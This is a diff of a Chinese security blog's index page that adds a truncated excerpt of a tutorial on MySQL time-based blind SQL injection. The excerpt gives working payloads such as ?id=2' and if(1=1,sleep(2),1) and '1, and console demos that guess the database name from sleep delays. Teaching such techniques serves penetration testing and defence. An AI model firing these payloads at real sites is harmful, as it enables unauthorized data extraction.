@@ -67,6 +67,70 @@
 <hr style="height:1px;border:none;border-top:1px dashed #0066CC;" />
 <article>
     <header>
+        <h2><a href="http://wyb0.com/posts/2016/injection-of-time-based/">SQL注入之基于时间的注入(MySQL)</a></h2>
+
+        
+        <div class="post-meta">
+            <div style="padding:5px 5px 2px 5px;">
+                <i class="fa fa-calendar fa-fw"></i>
+                <time>
+                    
+                        2016-06-24
+                    
+                </time>
+                &nbsp;&nbsp;&nbsp;&nbsp;
+            
+
+                
+
+            
+                
+                
+                
+                    <i class="fa fa-folder fa-fw"></i>
+                    
+                        <a class="post-taxonomy-topic" href="http://wyb0.com/topics/pentest">Pentest</a>
+                    
+                
+                
+                &nbsp;&nbsp;&nbsp;&nbsp;
+                
+                
+                
+                    <i class="fa fa-tags fa-fw"></i>
+                    
+                        <a class="post-taxonomy-tag" href="http://wyb0.com/tags/injection">injection</a>
+                    
+                
+                
+            </div>
+        </div>
+    </header>
+
+    
+    <p style="max-height:130px;overflow:hidden;line-height:26px;position: relative;word-wrap: break-word !important;z-index:1;">
+        0x00 特点 当页面存在注入，但是没有显示位且不管怎么测试返回页面都没有变化，此时可以使用基于时间的盲注进行注入。 其实只要存在SQL注入就可以使用基于时间的盲注，利用范围比较广泛，但是可能受到网络带宽等因素的影响。  0x01 利用方式 整型注入的话可以直接: ?id=if(1=1,sleep(2),1) 字符型的话需要闭合: ?id=2' and if(1=1,sleep(2),1) and '1  0x02 相关函数  if(条件, 值1, 值2)
+当条件为真时返回值1，条件为假时返回值2
+ sleep()
+sleep(2)睡眠两秒
+ benchmark(count, expr)
+benchmark是用于测试函数性能的，它是将表达式expr执行count次，执行次数越多耗费时间越久
+  0x03 基于时间的注入payload mysql&gt; select if((select database()) like &quot;rte%&quot;,sleep(2),666); +---------------------------------------------------+ | if((select database()) like &quot;rte%&quot;,sleep(2),666) | +---------------------------------------------------+ | 0 | +---------------------------------------------------+ 1 row in set (2.00 sec) mysql&gt; select if((select database())=&quot;rteaaa&quot;,sleep(2),666); +-----------------------------------------------+ | if((select database())=&quot;rtest1&quot;,sleep(2),666) | +-----------------------------------------------+ | 666 | +-----------------------------------------------+ 1 row in set (0.
+    </p>
+
+    
+    <footer>
+        <a href="/posts/2016/injection-of-time-based/">Read more<i class="fa fa-angle-double-right fa-fw"></i></a>
+    </footer>
+    
+</article>
+
+
+                
+                    
+<hr style="height:1px;border:none;border-top:1px dashed #0066CC;" />
+<article>
+    <header>
         <h2><a href="http://wyb0.com/posts/2016/injection-of-boolian-based/">SQL注入之布尔型注入(MySQL)</a></h2>
 
         
@@ -503,7 +567,7 @@ use test; 选择数据库为test create table aaa(bbb varchar(64)); 在数据库
         
             <li style="list-style-type:none;">
                 <i class="fa fa-folder fa-fw"></i>
-                <a href="http://wyb0.com/topics/pentest" title="pentest">pentest(78)</a>
+                <a href="http://wyb0.com/topics/pentest" title="pentest">pentest(79)</a>
             </li>
         
             <li style="list-style-type:none;">
@@ -610,7 +674,7 @@ use test; 选择数据库为test create table aaa(bbb varchar(64)); 在数据库
         
             <p style="display:inline-block;">
                 <a href="http://wyb0.com/tags/injection" title="injection">injection</a>
-                <sup>16</sup>
+                <sup>17</sup>
             </p>
         
             <p style="display:inline-block;">
